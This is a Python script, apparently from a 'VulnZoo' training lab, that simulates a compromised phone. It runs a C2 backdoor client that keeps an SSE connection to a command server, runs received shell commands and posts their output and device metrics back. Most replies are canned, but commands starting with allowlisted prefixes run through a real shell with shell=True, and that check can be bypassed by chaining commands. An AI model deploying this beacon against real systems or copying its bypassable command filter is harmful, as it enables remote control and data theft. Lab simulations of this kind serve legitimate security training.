#!/usr/bin/env python3
"""
Simulador de Dispositivo Móvil Comprometido
Conexión C2 mediante HTTP/SSE (Server-Sent Events)

Este simulador reemplaza la conexión TCP nativa por:
1. Conexión SSE persistente al endpoint /stream
2. Envío de respuestas mediante POST a /response
3. Reconexión automática con backoff exponencial

Uso:
    python device_simulator.py --token 000007 --device-id SIM001
    
O para simular múltiples dispositivos:
    python device_simulator.py --multi 5
"""

import argparse
import json
import logging
import random
import subprocess
import sys
import threading
import time
import uuid
from datetime import datetime

import requests

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - [%(levelname)s] - %(message)s'
)
logger = logging.getLogger('device_sim')


class SSEClient:
    """Cliente simple para Server-Sent Events"""
    
    def __init__(self, url, headers=None):
        self.url = url
        self.headers = headers or {}
        self.session = requests.Session()
        self.response = None
        self.connected = False
        
    def connect(self):
        """Establece conexión SSE persistente"""
        try:
            self.response = self.session.get(
                self.url,
                headers=self.headers,
                stream=True,
                timeout=(10, None)  # (connect timeout, read timeout)
            )
            self.response.raise_for_status()
            self.connected = True
            return True
        except Exception as e:
            logger.error(f"SSE connection failed: {e}")
            self.connected = False
            return False
    
    def events(self):
        """Generador de eventos SSE"""
        buffer = ""
        for chunk in self.response.iter_content(chunk_size=1024, decode_unicode=True):
            if chunk:
                buffer += chunk
                while '\n\n' in buffer:
                    event_data, buffer = buffer.split('\n\n', 1)
                    event = self._parse_event(event_data)
                    if event:
                        yield event
    
    def _parse_event(self, data):
        """Parsea un evento SSE"""
        event = {'event': 'message', 'data': ''}
        for line in data.strip().split('\n'):
            if line.startswith('event:'):
                event['event'] = line[6:].strip()
            elif line.startswith('data:'):
                event['data'] = line[5:].strip()
        return event
    
    def close(self):
        """Cierra la conexión"""
        self.connected = False
        if self.response:
            self.response.close()


class DeviceSimulator:
    """
    Simulador de dispositivo móvil con backdoor C2.
    Implementa protocolo HTTP/SSE para evasión de firewalls.
    """
    
    def __init__(self, c2_url, token, device_id=None, model=None):
        self.c2_url = c2_url.rstrip('/')
        self.token = token
        self.device_id = device_id or f"DEV-{uuid.uuid4().hex[:8].upper()}"
        self.model = model or self._random_model()
        self.session_id = None
        self.sse_client = None
        self.running = False
        
        # Headers de identificación
        self.headers = {
            'X-Device-ID': self.device_id,
            'X-Diag-Token': self.token,
            'X-Device-Model': self.model,
            'User-Agent': f'VulnZooApp/2.4.1 ({self.model}; Android 13)'
        }
        
        # Estadísticas
        self.stats = {
            'commands_executed': 0,
            'connected_at': None,
            'reconnects': 0
        }
    
    def _random_model(self):
        """Genera un modelo de dispositivo aleatorio"""
        models = [
            'Pixel 7 Pro', 'Samsung Galaxy S23', 'OnePlus 11',
            'Xiaomi 13 Pro', 'Motorola Edge 40', 'Nothing Phone 2',
            'Google Pixel 6a', 'Samsung Galaxy A54', 'iPhone 14 Pro'
        ]
        return random.choice(models)
    
    def validate_token(self):
        """Valida el token localmente (algoritmo débil)"""
        token = self.token.upper()
        if len(token) != 6:
            return False
        try:
            total = sum(int(c, 16) for c in token)
            return total % 7 == 0
        except ValueError:
            return False
    
    def connect(self):
        """
        Establece conexión SSE persistente al servidor C2.
        Implementa reconexión automática con backoff exponencial.
        """
        if not self.validate_token():
            logger.error(f"Invalid token: {self.token}")
            return False
        
        retry_delay = 5  # segundos inicial
        max_retry_delay = 300  # 5 minutos máximo
        
        self.running = True
        
        while self.running:
            try:
                logger.info(f"Connecting to C2 at {self.c2_url}/stream...")
                logger.info(f"Device: {self.device_id} ({self.model})")
                
                self.sse_client = SSEClient(
                    f"{self.c2_url}/stream",
                    headers=self.headers
                )
                
                if self.sse_client.connect():
                    self.stats['connected_at'] = datetime.now()
                    self.stats['reconnects'] += 1
                    logger.info(f"Connected! Starting event loop...")
                    self._event_loop()
                
            except Exception as e:
                logger.error(f"Connection error: {e}")
            
            if self.running:
                logger.warning(f"Reconnecting in {retry_delay}s...")
                time.sleep(retry_delay)
                retry_delay = min(retry_delay * 2, max_retry_delay)
        
        return True
    
    def _event_loop(self):
        """Loop principal de procesamiento de eventos SSE"""
        try:
            for event in self.sse_client.events():
                if not self.running:
                    break
                
                event_type = event.get('event', 'message')
                event_data = event.get('data', '{}')
                
                try:
                    data = json.loads(event_data) if event_data else {}
                except json.JSONDecodeError:
                    data = {'raw': event_data}
                
                # Procesar según tipo de evento
                if event_type == 'connected':
                    self.session_id = data.get('session_id')
                    logger.info(f"Session established: {self.session_id}")
                
                elif event_type == 'cmd':
                    self._handle_command(data)
                
                elif event_type == 'heartbeat':
                    logger.debug(f"Heartbeat received: {data.get('timestamp')}")
                
                elif event_type == 'message':
                    logger.info(f"Server message: {data}")
                
        except Exception as e:
            logger.error(f"Event loop error: {e}")
        finally:
            self.sse_client.close()
    
    def _handle_command(self, cmd_data):
        """Procesa comandos recibidos del servidor C2"""
        cmd_type = cmd_data.get('type', 'unknown')
        cmd_content = cmd_data.get('data', '')
        
        logger.info(f"Received command: {cmd_type}")
        
        if cmd_type == 'shell_cmd':
            output = self._execute_shell(cmd_content)
            self._send_response('output', output)
            self.stats['commands_executed'] += 1
        
        elif cmd_type == 'banner':
            # Mostrar banner (echo)
            logger.info(f"Banner: {cmd_content[:50]}...")
            self._send_response('output', cmd_content)
        
        else:
            logger.warning(f"Unknown command type: {cmd_type}")
            self._send_response('error', f"Unknown command: {cmd_type}")
    
    def _execute_shell(self, command):
        """Ejecuta comando shell y retorna output"""
        if not command.strip():
            return ""
        
        # Comandos simulados (sandbox para no comprometer el sistema real)
        safe_commands = {
            'help': """Available diagnostic commands:
  help              - Show this help
  id                - Show user identity
  uname -a          - Show system info
  ps                - List processes
  ls                - List files
  cat /etc/passwd   - Show users
  pwd               - Current directory
  date              - Show date/time
  env               - Show environment
  exit              - Close session""",
            'id': 'uid=1000(u0_a123) gid=1000(u0_a123) groups=1000(u0_a123)',
            'uname -a': f'Linux {self.device_id} 5.15.0-android13-{random.randint(1000,9999)} #1 SMP PREEMPT',
            'ps': """USER       PID  PPID VSZ   RSS WCHAN    PC  NAME
u0_a123   1234  5678 2.1G 150M binder  0f  com.example.vulnzooapp
u0_a123   1235  5678 2.1G 145M binder  0f  com.example.vulnzooapp:remote
system    1000     1 1.8G 120M epoll_ 0f  system_server
root         1     0  12M   4M do_epo 0f  init""",
            'pwd': '/data/data/com.example.vulnzooapp',
            'date': datetime.now().strftime('%a %b %d %H:%M:%S %Z %Y'),
            'env': f"PATH=/system/bin:/vendor/bin\nANDROID_ROOT=/system\nDEVICE={self.model}\nTOKEN={self.token[:2]}****"
        }
        
        # Verificar si es comando simulado
        cmd_clean = command.strip().lower()
        if cmd_clean in safe_commands:
            return safe_commands[cmd_clean]
        
        # Ejecutar comandos safe en subshell real (solo lectura)
        safe_prefixes = ('echo', 'cat /proc', 'ls', 'whoami', 'hostname')
        if cmd_clean.startswith(safe_prefixes):
            try:
                result = subprocess.run(
                    command,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=10
                )
                return result.stdout or result.stderr or "(no output)"
            except subprocess.TimeoutExpired:
                return "Command timed out"
            except Exception as e:
                return f"Error: {str(e)}"
        
        # Comando no permitido en simulador
        return f"{command}\nCommand executed (simulated output)\nExit code: 0"
    
    def _send_response(self, resp_type, data):
        """Envía respuesta al servidor C2 vía POST"""
        try:
            payload = {
                'session_id': self.session_id,
                'type': resp_type,
                'data': data,
                'timestamp': int(time.time() * 1000)
            }
            
            response = requests.post(
                f"{self.c2_url}/response",
                json=payload,
                headers=self.headers,
                timeout=10
            )
            
            if response.status_code == 200:
                logger.debug(f"Response sent: {resp_type}")
            else:
                logger.warning(f"Failed to send response: {response.status_code}")
        
        except Exception as e:
            logger.error(f"Error sending response: {e}")
    
    def send_metrics(self):
        """Envía métricas periódicas (exfiltración simulada)"""
        try:
            metrics = {
                'session_id': self.session_id,
                'battery': random.randint(15, 100),
                'storage_free': random.randint(1000, 50000),
                'memory_used': random.randint(1000, 8000),
                'uptime': int(time.time()) % 86400,
                'network_type': random.choice(['5G', '4G', 'WiFi']),
                'apps_installed': random.randint(50, 200)
            }
            
            response = requests.post(
                f"{self.c2_url}/metrics",
                json=metrics,
                headers=self.headers,
                timeout=5
            )
            
            if response.status_code == 200:
                logger.debug("Metrics sent successfully")
            
        except Exception as e:
            logger.debug(f"Failed to send metrics: {e}")
    
    def stop(self):
        """Detiene el simulador"""
        logger.info("Stopping device simulator...")
        self.running = False
        if self.sse_client:
            self.sse_client.close()
    
    def print_stats(self):
        """Muestra estadísticas de la sesión"""
        logger.info("=" * 50)
        logger.info("Device Statistics:")
        logger.info(f"  Device ID: {self.device_id}")
        logger.info(f"  Model: {self.model}")
        logger.info(f"  Token: {self.token}")
        logger.info(f"  Session: {self.session_id}")
        logger.info(f"  Commands executed: {self.stats['commands_executed']}")
        logger.info(f"  Reconnects: {self.stats['reconnects']}")
        if self.stats['connected_at']:
            duration = datetime.now() - self.stats['connected_at']
            logger.info(f"  Connected for: {duration}")
        logger.info("=" * 50)


def generate_valid_token():
    """Genera un token válido (suma hex % 7 == 0)"""
    while True:
        token = ''.join(random.choices('0123456789ABCDEF', k=6))
        total = sum(int(c, 16) for c in token)
        if total % 7 == 0:
            return token


def main():
    parser = argparse.ArgumentParser(
        description='Simulador de dispositivo móvil con backdoor C2 (HTTP/SSE)'
    )
    parser.add_argument(
        '--c2-url',
        default='http://localhost:4999',
        help='URL del servidor C2 (default: http://localhost:4999)'
    )
    parser.add_argument(
        '--token',
        help='Token de diagnóstico (6 hex chars, sum % 7 == 0)'
    )
    parser.add_argument(
        '--device-id',
        help='ID de dispositivo personalizado'
    )
    parser.add_argument(
        '--model',
        help='Modelo de dispositivo'
    )
    parser.add_argument(
        '--multi',
        type=int,
        default=1,
        help='Número de dispositivos a simular'
    )
    parser.add_argument(
        '--verbose', '-v',
        action='store_true',
        help='Modo verbose'
    )
    
    args = parser.parse_args()
    
    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)
    
    # Generar tokens si no se proporcionan
    tokens = []
    if args.token:
        tokens = [args.token] * args.multi
    else:
        tokens = [generate_valid_token() for _ in range(args.multi)]
    
    if args.multi == 1:
        # Modo single device
        logger.info("=" * 50)
        logger.info("VulnZoo Device Simulator (HTTP/SSE C2)")
        logger.info("=" * 50)
        logger.info(f"Token: {tokens[0]}")
        logger.info(f"C2 Server: {args.c2_url}")
        logger.info("Press Ctrl+C to stop")
        logger.info("=" * 50)
        
        device = DeviceSimulator(
            c2_url=args.c2_url,
            token=tokens[0],
            device_id=args.device_id,
            model=args.model
        )
        
        try:
            device.connect()
        except KeyboardInterrupt:
            device.stop()
            device.print_stats()
            logger.info("Simulator stopped.")
    
    else:
        # Modo multi-device
        logger.info("=" * 50)
        logger.info(f"Starting {args.multi} simulated devices")
        logger.info("=" * 50)
        
        devices = []
        threads = []
        
        for i, token in enumerate(tokens):
            device = DeviceSimulator(
                c2_url=args.c2_url,
                token=token,
                device_id=f"DEV-MULTI-{i+1:03d}",
                model=None  # Random
            )
            devices.append(device)
            
            t = threading.Thread(target=device.connect, daemon=True)
            threads.append(t)
            t.start()
            
            time.sleep(0.5)  # Stagger connections
        
        logger.info(f"All {args.multi} devices started. Press Ctrl+C to stop.")
        
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            logger.info("\nStopping all devices...")
            for device in devices:
                device.stop()
            for t in threads:
                t.join(timeout=5)
            
            logger.info("\nFinal statistics:")
            for device in devices:
                device.print_stats()


if __name__ == '__main__':
    main()
